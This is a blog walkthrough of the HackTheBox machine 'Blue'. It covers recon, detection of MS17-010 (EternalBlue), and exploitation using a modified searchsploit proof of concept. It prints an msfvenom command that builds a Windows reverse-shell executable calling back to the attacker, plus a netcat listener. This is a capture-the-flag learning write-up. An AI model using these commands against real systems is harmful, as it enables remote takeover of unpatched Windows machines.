<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="d ago"><meta name="hour-prompt" content="hr ago"><meta name="minute-prompt" content="min ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB: Blue" /><meta name="author" content="Nullprism" /><meta property="og:locale" content="en" /><meta name="description" content="Intro" /><meta property="og:description" content="Intro" /><link rel="canonical" href="https://blog.nullprism.io//posts/htb-blue/" /><meta property="og:url" content="https://blog.nullprism.io//posts/htb-blue/" /><meta property="og:site_name" content="Nullprism" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-13T16:36:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB: Blue" /><meta name="twitter:site" content="@nullprism" /><meta name="twitter:creator" content="@Nullprism" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Nullprism"},"headline":"HTB: Blue","dateModified":"2021-08-13T16:36:00-05:00","datePublished":"2021-08-13T16:36:00-05:00","url":"https://blog.nullprism.io//posts/htb-blue/","description":"Intro","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.nullprism.io//posts/htb-blue/"},"@context":"https://schema.org"}</script><title>HTB: Blue | Nullprism</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nullprism"><meta name="application-name" content="Nullprism"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="http://wonderworlds.org/images/crystal_fantasy/fantasy-crystal-goldwater1.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nullprism</a></div><div class="site-subtitle font-italic">Yet Another Cybersecurity Blog. But its more for me, than you.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nullprism" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/nullprism" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['nullprism','nullprism.io'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB: Blue</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB: Blue</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Nullprism </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 13, 2021, 4:36 PM -0500" >Aug 13<i class="unloaded">2021-08-13T16:36:00-05:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1322 words">7 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 200'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/img/htb/blue/blue_title_card.png" class="preview-img" alt="Blue Title Card" width="500" height="200"><h2 id="intro">Intro</h2><p>While ultimately not a challenging box - my frustrations were mostly with my own tooling. The python2/python3 split and slow deprecation of python2 has created huge amounts of annoyance. I typically try to rewrite everything I find in python2 into python3 these days, but sometimes that is either a ridiculous amount of work for the task, or you run into weird implementation issues like byte/string concatenation errors. Regardless of how much I dislike having to do it, having a good python2 AND a good python3 environment will just make your life easier, and I inevitably set one up with <a href="https://github.com/pyenv/pyenv">pyenv</a> during this box engagement.</p><h2 id="reconnaissance">Reconnaissance</h2><h3 id="initial-engagement">Initial Engagement</h3><p>Typical initial engagement with the box.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> <span class="s1">'scans/initial'</span> 10.129.172.12
</pre></table></code></div></div><p>This will give me a quick overview of the most popular ports, and their potential services on this box.</p><ul><li><code class="language-plaintext highlighter-rouge">-sV</code> will probe all open ports to determine service and version info<li><code class="language-plaintext highlighter-rouge">-sC</code> will run default scripts against those services (not the ones flagged as unsafe, however)<li><code class="language-plaintext highlighter-rouge">-oA</code> will output all formats into my scans folder</ul><h3 id="initial-results">Initial Results</h3><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 15:22 EDT
Nmap scan report for 10.129.172.12
Host is up (0.059s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-11T20:23:45+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-11T19:23:41
|_  start_date: 2021-08-11T19:21:5
</pre></table></code></div></div><p>The box is named Blue, 445 is open, and its Windows 7. Pretty sure I know where this is going.</p><h3 id="more-recon">More Recon</h3><p>Despite my suspicions, I still believe in following through with your process, especially if you can do it concurrently.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-sU</span> <span class="nt">-p-</span> <span class="nt">-oA</span> <span class="s1">'scans/all-ports'</span> 10.129.172.12
</pre></table></code></div></div><p><strong>Side Note:</strong> This completed much later in the engagement, with no additional findings of note.</p><h2 id="enumeration">Enumeration</h2><h3 id="initial-assessments">Initial Assessments</h3><p>Port 445 is open, and initial NMAP scanning tells us the hostname is HARIS-PC, its not likely joined to a domain (or hasn’t been) and we are running on Windows 7 Professional SP1. Based on the output, it does appear a guest account exists. This is shaking out to be a pretty viable target candidate for something like <a href="https://en.wikipedia.org/wiki/EternalBlue">Eternal Blue</a>.</p><h3 id="smb">SMB</h3><p>Further SMB vulnerability scanning.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/blue]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--script</span> vuln <span class="nt">-script-args</span><span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span>1 <span class="nt">-p139</span>,445 10.129.172.12
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-11 15:29 EDT
Nmap scan report <span class="k">for </span>10.129.172.12
Host is up <span class="o">(</span>0.058s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk <span class="nb">factor</span>: HIGH
|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
|           
|     Disclosure <span class="nb">date</span>: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.87 seconds
</pre></table></code></div></div><p>The scans report the target IS vulnerable to <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a> (Hint: EternalBlue/EternalRomance). Given the viability of this exploit, I’m going to stop enumeration here, and proceed with trying to exploit the target via this vector.</p><h2 id="exploitation">Exploitation</h2><h3 id="initial-assessments-1">Initial Assessments</h3><p><img data-proofer-ignore data-src="/assets/img/htb/blue/blue_searchsploit.png" alt="Searchsploit MS17-010" /></p><p>As suspected, there are several POCs within <code class="language-plaintext highlighter-rouge">searchsploit</code>. I am not interested in any Metasploit module; the Windows7/2008 R2 POC in python seems worth pulling down.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>searchsploit <span class="nt">-m</span> 42031
<span class="nb">mv </span>42031.py MS17-010.py
</pre></table></code></div></div><h3 id="setting-up-the-exploit">Setting Up the Exploit</h3><p><img data-proofer-ignore data-src="/assets/img/htb/blue/blue_poc_header.png" alt="Exploit Header" /></p><p>Reading the comments and the imports of the code, there is an additional dependency to pull in, <code class="language-plaintext highlighter-rouge">mysmb.py</code> which we will need to do. We modify the username to <strong><em>guest</em></strong>, thanks to NMAP enumerating that for us. <strong><em>Note:</em></strong> Modified POC code for this specific engagement is hosted on my <a href="https://github.com/nullprism/htb-boxes/tree/main/blue">GitHub</a>.</p><p>At this point we need to read what the POC actually does. More often than not, POC (Proof of Concepts) aren’t set up for you to just deliver shells to a target, it just simply….a proof of concept. You need to modify them for your intended use. <em>Usually</em>, they are well-documented for something like this. In this particular case, this POC is not particularly well documented. So you have typically have one of two options.</p><p><strong>1)</strong> Read through the code manually to fully understand what is going on so you can modify it to suit your needs.</p><p><strong><em>OR</em></strong></p><p><strong>2)</strong> Run the code against a mock test target in a sandbox target and see what happens.</p><p>Honestly - you should be doing both with anything you download off the internet. If this were a live engagements (i.e. not a CTF or HackTheBox) you would ABSOLUTELY be doing both. Never, never, never - blindly throw exploits.</p><p>Jumping off my brief soap box, doing #1 of what I just preached about, we find this function.</p><p><img data-proofer-ignore data-src="/assets/img/htb/blue/blue_smbpwn.png" alt="def smb pwn" /></p><p>In the case of this POC, the exploit creates a plaintext file in C:\ named <code class="language-plaintext highlighter-rouge">pwned.txt</code> and exits. Cool for testing and proof, but not what we want. We want a shell. A reverse shell. In the above screenshot, I commented out the original POC code, and added in delivery of a shell named <code class="language-plaintext highlighter-rouge">eternal_blue.exe</code> and then the service execution of that shell.</p><h3 id="building-the-payload">Building the Payload</h3><p>As always, <code class="language-plaintext highlighter-rouge">msfvenom</code> is our best friend here.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/htb/blue/exploits]
└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.94 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-f</span> exe <span class="o">&gt;</span> eternal_blue.exe           
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
</pre></table></code></div></div><h3 id="setup-listener">Setup Listener</h3><p>Set up our listener to catch the call back.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 4443
</pre></table></code></div></div><h3 id="launch-exploit-python-environment-ridiculousness">Launch Exploit (Python Environment Ridiculousness)</h3><p>With our listener setup, we launch the exploit.</p><p><img data-proofer-ignore data-src="/assets/img/htb/blue/blue_exploit_fire.png" alt="Exploit Fire" /></p><p>Seems simple, right? If it fires like this for you, enjoy life; you probably exist in a time in the future where the POC and/or OS has been updated to address things. If you get weird errors about byte and string concatenation, etc - you’re probably going to have to set up a python2 environment</p><p>There are many ways to approach this, this is just the route I chose. <a href="https://github.com/pyenv/pyenv">pyenv</a> allows you to have multiple version/instances of python installed on your system and for you to switch between them in the shell context. Once you have pyenv installed (there are plenty of guides on that), install Python 2.7.18, switch to that environment in the shell, install the dependencies for the exploit (likely setuptools and <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>) and you should be back off to the races.</p><h3 id="shell">Shell</h3><p><img data-proofer-ignore data-src="/assets/img/htb/blue/blue_shell.png" alt="Blue Shell" /></p><p>Once the exploit fires, our listener receives its call back and we have shell.</p><h2 id="post-exploitation">Post-Exploitation</h2><h3 id="initial-assessments-2">Initial Assessments</h3><p>A quick initial orientation tells me that we are <strong>NT AUTHORITY\SYSTEM</strong> and that we are on the intended target host.</p><h2 id="privilege-escalation">Privilege Escalation</h2><p>Given our exploit vector, no privilege escalation is necessary on this engagement. We are already “root.” We can just go straight for flags.</p><h2 id="flags">Flags</h2><p><img data-proofer-ignore data-src="/assets/img/htb/blue/blue_user_flag.png" alt="Blue User Flag" /></p><p><img data-proofer-ignore data-src="/assets/img/htb/blue/blue_root_flag.png" alt="Blue Root Flag" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oscp-like/" class="post-tag no-text-decoration" >oscp-like</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp prep</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/blue/" class="post-tag no-text-decoration" >blue</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/pyenv/" class="post-tag no-text-decoration" >pyenv</a> <a href="/tags/eternalblue/" class="post-tag no-text-decoration" >eternalblue</a> <a href="/tags/eternalromance/" class="post-tag no-text-decoration" >eternalromance</a> <a href="/tags/msfvenom/" class="post-tag no-text-decoration" >msfvenom</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/ms17-010/" class="post-tag no-text-decoration" >ms17-010</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB: Blue - Nullprism&url=https://blog.nullprism.io//posts/htb-blue/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB: Blue - Nullprism&u=https://blog.nullprism.io//posts/htb-blue/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB: Blue - Nullprism&url=https://blog.nullprism.io//posts/htb-blue/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-devel/">HTB: Devel</a><li><a href="/posts/htb-legacy/">HTB: Legacy</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/oscp-like/">oscp-like</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/nmap/">nmap</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-jerry/"><div class="card-body"> <span class="timeago small" >Aug 9<i class="unloaded">2021-08-09T15:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Jerry</h3><div class="text-muted small"><p> Intro I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community consen...</p></div></div></a></div><div class="card"> <a href="/posts/htb-legacy/"><div class="card-body"> <span class="timeago small" >Aug 3<i class="unloaded">2021-08-03T22:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Legacy</h3><div class="text-muted small"><p> Intro So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community con...</p></div></div></a></div><div class="card"> <a href="/posts/htb-devel/"><div class="card-body"> <span class="timeago small" >Aug 4<i class="unloaded">2021-08-04T21:10:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB: Devel</h3><div class="text-muted small"><p> Intro I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don’t have any reason not to. Community consen...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-jerry/" class="btn btn-outline-primary" prompt="Older"><p>HTB: Jerry</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/nullprism">Nullprism</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/oscp-like/">oscp like</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/nmap/">nmap</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blog.nullprism.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-E8EH9MYEVL"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-E8EH9MYEVL'); }); </script>
